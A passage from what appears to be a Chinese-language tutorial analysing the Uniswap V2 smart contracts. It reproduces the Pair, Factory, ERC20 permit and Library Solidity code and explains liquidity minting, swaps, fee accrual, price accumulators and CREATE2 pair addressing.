    if (allowance[from][msg.sender] != uint(-1)) &#123;\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        &#125;\n        _transfer(from, to, value);\n        return true;\n    &#125;\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123;\n        require(deadline >= block.timestamp, 'UniswapV2: EXPIRED');\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                '\\x19\\x01',\n                DOMAIN_SEPARATOR,\n                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, 'UniswapV2: INVALID_SIGNATURE');\n        _approve(owner, spender, value);\n    &#125;\n&#125;\n\ncontract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123;\n    using SafeMath  for uint;\n    using UQ112x112 for uint224;\n\n    uint public constant MINIMUM_LIQUIDITY = 10**3;\n    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n\n    address public factory;\n    address public token0;\n    address public token1;\n\n    uint112 private reserve0;           // uses single storage slot, accessible via getReserves\n    uint112 private reserve1;           // uses single storage slot, accessible via getReserves\n    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint public price0CumulativeLast;\n    uint public price1CumulativeLast;\n    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n\n    uint private unlocked = 1;\n    modifier lock() &#123;\n        require(unlocked == 1, 'UniswapV2: LOCKED');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    &#125;\n\n    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123;\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    &#125;\n\n    function _safeTransfer(address token, address to, uint value) private &#123;\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));\n        require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');\n    &#125;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() public &#123;\n        factory = msg.sender;\n    &#125;\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external &#123;\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    &#125;\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;\n        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), 'UniswapV2: OVERFLOW');\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        &#125;\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    &#125;\n\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint _kLast = kLast; // gas savings\n        if (feeOn) &#123;\n            if (_kLast != 0) &#123;\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) &#123;\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                &#125;\n            &#125;\n        &#125; else if (_kLast != 0) &#123;\n            kLast = 0;\n        &#125;\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) &#123;\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) &#123;\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        &#125; else &#123;\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        &#125;\n        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 &amp;&amp; amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    &#125;\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;\n        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 &amp;&amp; to != _token1, 'UniswapV2: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        &#125;\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n        &#125;\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    &#125;\n\n    // force balances to match reserves\n    function skim(address to) external lock &#123;\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    &#125;\n\n    // force reserves to match balances\n    function sync() external lock &#123;\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    &#125;\n&#125;\n\ncontract UniswapV2Factory is IUniswapV2Factory &#123;\n    address public feeTo;\n    address public feeToSetter;\n\n    mapping(address => mapping(address => address)) public getPair;\n    address[] public allPairs;\n\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    constructor(address _feeToSetter) public &#123;\n        feeToSetter = _feeToSetter;\n    &#125;\n\n    function allPairsLength() external view returns (uint) &#123;\n        return allPairs.length;\n    &#125;\n\n    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;\n        require(tokenA != tokenB, 'UniswapV2: IDENTICAL_ADDRESSES');\n        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), 'UniswapV2: ZERO_ADDRESS');\n        require(getPair[token0][token1] == address(0), 'UniswapV2: PAIR_EXISTS'); // single check is sufficient\n        bytes memory bytecode = type(UniswapV2Pair).creationCode;\n        bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n        assembly &#123;\n            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)\n        &#125;\n        IUniswapV2Pair(pair).initialize(token0, token1);\n        getPair[token0][token1] = pair;\n        getPair[token1][token0] = pair; // populate mapping in the reverse direction\n        allPairs.push(pair);\n        emit PairCreated(token0, token1, pair, allPairs.length);\n    &#125;\n\n    function setFeeTo(address _feeTo) external &#123;\n        require(msg.sender == feeToSetter, 'UniswapV2: FORBIDDEN');\n        feeTo = _feeTo;\n    &#125;\n\n    function setFeeToSetter(address _feeToSetter) external &#123;\n        require(msg.sender == feeToSetter, 'UniswapV2: FORBIDDEN');\n        feeToSetter = _feeToSetter;\n    &#125;\n&#125;\n\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n\nlibrary SafeMath &#123;\n    function add(uint x, uint y) internal pure returns (uint z) &#123;\n        require((z = x + y) >= x, 'ds-math-add-overflow');\n    &#125;\n\n    function sub(uint x, uint y) internal pure returns (uint z) &#123;\n        require((z = x - y) &lt;= x, 'ds-math-sub-underflow');\n    &#125;\n\n    function mul(uint x, uint y) internal pure returns (uint z) &#123;\n        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\n    &#125;\n&#125;\n\n// a library for performing various math operations\n\nlibrary Math &#123;\n    function min(uint x, uint y) internal pure returns (uint z) &#123;\n        z = x &lt; y ? x : y;\n    &#125;\n\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\n    function sqrt(uint y) internal pure returns (uint z) &#123;\n        if (y > 3) &#123;\n            z = y;\n            uint x = y / 2 + 1;\n            while (x &lt; z) &#123;\n                z = x;\n                x = (y / x + x) / 2;\n            &#125;\n        &#125; else if (y != 0) &#123;\n            z = 1;\n        &#125;\n    &#125;\n&#125;\nlibrary UQ112x112 &#123;\n    uint224 constant Q112 = 2**112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) &#123;\n        z = uint224(y) * Q112; // never overflows\n    &#125;\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;\n        z = x / uint224(y);\n    &#125;\n&#125;\n\n\n\nAnalyze1.UniswapV2ERC20.sol\n首先是UniswapV2ERC20.sol，显而易见这部分代码实现了一个ERC-20的合约，但是此处多了一个permit方法，具体功能类似于approve\npermit, which allows users to modify the allowance mapping using a signed message, instead of through msg.sender\n官方文档给出如上解释\nDOMAIN_SEPARATOR只不过是唯一标识智能合约的哈希。 它是由EIP712Domain的字符串，包含代币合约的名称，版本，所在的chainId以及合约部署的地址构成。\nPERMIT_TYPEHASH 是函数名称(大写开头)和所有参数(包括类型和名称)的哈希。 目的是清楚的标志签名的函数。\n2.UniswapV2Factory.sol\nfeeTo–收费地址\nfeeToSetter–可以修改feeto的地址\ngetPair–记录交易对\nallPairs–全部交易对\n该部分有三个方法，setfeeto,setfeetosetter和createpair，feeto只有feetosetter可以修改，feeToSetter只有feeToSetter可以修改\ncreatepair会创建交易对，对于token地址会进行排序，小的小的作为token0，大的作为token1，之后使用hash(token0，token1)作为salt，使用create2进行pair合约的部署，并将新的pair添加到getpair和allpair中。由于salt值可以线下计算出来，所以pair的地址是可以自行计算的。\n3.UniswapV2Pair.sol\n了解到这部分时要了解到UQ112x112部分\nlibrary UQ112x112 &#123;\n    uint224 constant Q112 = 2**112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) &#123;\n        z = uint224(y) * Q112; // never overflows\n    &#125;\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;\n        z = x / uint224(y);\n    &#125;\n&#125;\n\n因为solidity中不允许出现小数，但是token数量又一定会出现小数，所以使用uint224，其中112位作为整数部分，另112位作为小数部分，这样精度即可达到1&#x2F;2**112,最后的uint32用来存储timestamp\ninitialize函数会在合约创建时被调用，初始化factory地址，以及两个token的address\n以下为mint函数和burn函数\nfunction mint(address to) external lock returns (uint liquidity) &#123;\n       (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n       uint balance0 = IERC20(token0).balanceOf(address(this));\n       uint balance1 = IERC20(token1).balanceOf(address(this));\n       uint amount0 = balance0.sub(_reserve0);\n       uint amount1 = balance1.sub(_reserve1);\n\n       bool feeOn = _mintFee(_reserve0, _reserve1);\n       uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n       if (_totalSupply == 0) &#123;\n           liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n          _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n       &#125; else &#123;\n           liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n       &#125;\n       require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n       _mint(to, liquidity);\n\n       _update(balance0, balance1, _reserve0, _reserve1);\n       if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n       emit Mint(msg.sender, amount0, amount1);\n   &#125;\n    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;\n       (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n       address _token0 = token0;                                // gas savings\n       address _token1 = token1;                                // gas savings\n       uint balance0 = IERC20(_token0).balanceOf(address(this));\n       uint balance1 = IERC20(_token1).balanceOf(address(this));\n       uint liquidity = balanceOf[address(this)];\n\n       bool feeOn = _mintFee(_reserve0, _reserve1);\n       uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n       amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n       amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n       require(amount0 > 0 &amp;&amp; amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n       _burn(address(this), liquidity);\n       _safeTransfer(_token0, to, amount0);\n       _safeTransfer(_token1, to, amount1);\n       balance0 = IERC20(_token0).balanceOf(address(this));\n       balance1 = IERC20(_token1).balanceOf(address(this));\n\n       _update(balance0, balance1, _reserve0, _reserve1);\n       if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n       emit Burn(msg.sender, amount0, amount1, to);\n   &#125;\n\n铸币流程发生在router合约向pair合约发送代币之后，因此此次的储备量和合约的token余额是不相等的，中间的差值就是需要铸币的token金额。然后获取总的流动性的供应量totoalSupply，如果totalSupply等于0的话，就代表是首次铸币。\n\n具体参考whitepaper第3.4节\n其中给出了如下的解释\nFor example, suppose that the price of 1 ABC is currently 100 XYZ. If the initial deposit had been 2 ABC and 200 XYZ (a ratio of 1:100), the depositor would have received √ 2 · 200 &#x3D; 20 shares. Those shares should now still be worth 2 ABC and 200 XYZ, plus accumulated fees. If the initial deposit had been 2 ABC and 800 XYZ (a ratio of 1:400), the depositor would have received √ 2 · 800 &#x3D; 40 pool shares.\n至于为什么在第一次mint时要有最小的限额，是为了防止恶意抬高价格，比如先以1，进行mint，在使用大额数量的token，比如说1000000000token进行sync，此时totalsupply还是为1，但reserve0和reserve，一个为1，一个为100000001，所以lptoken得价格就变成了1000000001，使得散户难以参与\n销毁逻辑参照代码\n如果开启了手续费，就重新计算k值\nswap函数：\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;\n     require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n     (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n     require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\n     uint balance0;\n     uint balance1;\n     &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors\n     address _token0 = token0;\n     address _token1 = token1;\n     require(to != _token0 &amp;&amp; to != _token1, 'UniswapV2: INVALID_TO');\n     if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n     if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n     if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n     balance0 = IERC20(_token0).balanceOf(address(this));\n     balance1 = IERC20(_token1).balanceOf(address(this));\n     &#125;\n     uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n     uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n     require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n     &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors\n     uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n     uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n     require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n     &#125;\n\n     _update(balance0, balance1, _reserve0, _reserve1);\n     emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n &#125;\n\n交换token方法一般通过router合约调用，功能是交换token，首先确认amount0Out或者amount1Out有一个大于0，然后确保储备量大于要取出的金额。然后确保address(to)不等于对应的token地址。然后发送token到对应的地址上。如果data非空，就执行闪电贷的调用。通过调用address(to)下的uniswapV2Call函数进行闪电贷以及手续费的归还\namount0in和amount1in判断调用者是否转入另一token，如果没有就revert，如果有输入，还需要保证交换之后的储备量的乘积大于等于k,具体代码中计算公式如下\n\n之所以写作这样是因为solidity中没有小数，所以代码中表示为：\n\nfunction _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;\n       address feeTo = IUniswapV2Factory(factory).feeTo();\n       feeOn = feeTo != address(0);\n       uint _kLast = kLast; // gas savings\n       if (feeOn) &#123;\n           if (_kLast != 0) &#123;\n               uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n               uint rootKLast = Math.sqrt(_kLast);\n               if (rootK > rootKLast) &#123;\n                   uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                   uint denominator = rootK.mul(5).add(rootKLast);\n                   uint liquidity = numerator / denominator;\n                   if (liquidity > 0) _mint(feeTo, liquidity);\n               &#125;\n           &#125;\n       &#125; else if (_kLast != 0) &#123;\n           kLast = 0;\n       &#125;\n   &#125;\n\nmintfeee函数可用于判断平台是否收取手续费，因为每一笔交易都会有千分之三的手续费，那么k值也会随着缓慢增加，所以连续两个时刻之间的k值差值就是这段时间的手续费。即\n\n再进行流动性计算并且铸造给feeto，公式为\n\n.\nfunction _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;\n        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), 'UniswapV2: OVERFLOW');\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        &#125;\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    &#125;\n\nupdate函数会计算出时间间隔，更新储备量，并且计算“累计”价格时间值，price0CumulativeLast 是一个每秒钟按两个储量的比率递增的值。要将此值转换回价格，需要两个时间点值 price0CumulativeLast，使用以下公式：\n\n通过将两个样本中价格累计的差值除以这两个样本之间的秒数，过程被逆转，结果就是该时段的时间加权价格。\nfunction skim(address to) external lock &#123;\n    address _token0 = token0; // gas savings\n    address _token1 = token1; // gas savings\n    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n&#125;\n\n// force reserves to match balances\nfunction sync() external lock &#123;\n    _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n&#125;\n\nskim方法是强制让余额与储备量对等，sync方法则是强制让储备量与余额对等\nUniswapV2Library\nClick to see more\nlibrary UniswapV2Library &#123;\n    using SafeMath for uint;\n\n    // returns sorted token addresses, used to handle return values from pairs sorted in this order\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;\n        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n        (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n    &#125;\n\n    // calculates the CREATE2 address for a pair without making any external calls\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = address(uint(keccak256(abi.encodePacked(\n                hex'ff',\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n            ))));\n    &#125;\n\n    // fetches and sorts the reserves for a pair\n    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123;\n        (address token0,) = sortTokens(tokenA, tokenB);\n        (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n    &#125;\n\n    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n        require(reserveA > 0 &amp;&amp; reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    &#125;\n\n    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;\n        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n        require(reserveIn > 0 &amp;&amp; reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint amountInWithFee = amountIn.mul(997);\n        uint numerator = amountInWithFee.mul(reserveOut);\n        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n        amountOut = numerator / denominator;\n    &#125;\n\n    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123;\n        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');\n        require(reserveIn > 0 &amp;&amp; reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint numerator = reserveIn.mul(amountOut).mul(1000);\n        uint denominator = reserveOut.sub(amountOut).mul(997);\n        amountIn = (numerator / denominator).add(1);\n    &#125;\n\n    // performs chained getAmountOut calculations on any number of pairs\n    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[0] = amountIn;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n        &#125;\n    &#125;\n\n    // performs chained getAmountIn calculations on any number of pairs\n    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) &#123;\n        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[amounts.length - 1] = amountOut;\n        for (uint i = path.length - 1; i > 0; i--) &#123;\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);\n            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\n        &#125;\n    &#125;\n&#125;\n\n\n\nAnalyzefunction sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;\n    require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n    (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n    require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n&#125;\n\n首先是sorttokens函数，该函数首先判断token0和token1是否指向同一个地址，在进行大小区分，小的为token0，大的为token1，并且判断没有token的地址为0，和上述createpair函数内的地址排序功能相同\nfunction pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;\n    (address token0, address token1) = sortTokens(tokenA, tokenB);\n    pair = address(uint(keccak256(abi.encodePacked(\n            hex'ff',\n            factory,\n            keccak256(abi.encodePacked(token0, token1)),\n            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n        ))));\n&#125;\n\npairFor函数用于计算生成的交易对的地址，具体参考create2方法\n\n\nfunction getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123;\n    (address token0,) &#x3D; sortTokens(tokenA, tokenB);\n    (uint reserve0, uint reserve1,) &#x3D; IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n    (reserveA, reserveB) &#x3D; tokenA &#x3D;&#x3D; token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n&#125;\n\ngetReserves函数获取token0以及token1的储备值（恒定乘积的各资产的值）\nfunction quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;\n    require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n    require(reserveA > 0 &amp;&amp; reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n    amountB = amountA.mul(reserveB) / reserveA;\n&#125;\n\nquote函数根据给定的两个 token 的储备量和其中一个 token 数量，计算得到另一个 token 等值的数值\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;\n        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n        require(reserveIn > 0 &amp;&amp; reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint amountInWithFee = amountIn.mul(997);\n        uint numerator = amountInWithFee.mul(reserveOut);\n        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n        amountOut = numerator / denominator;\n    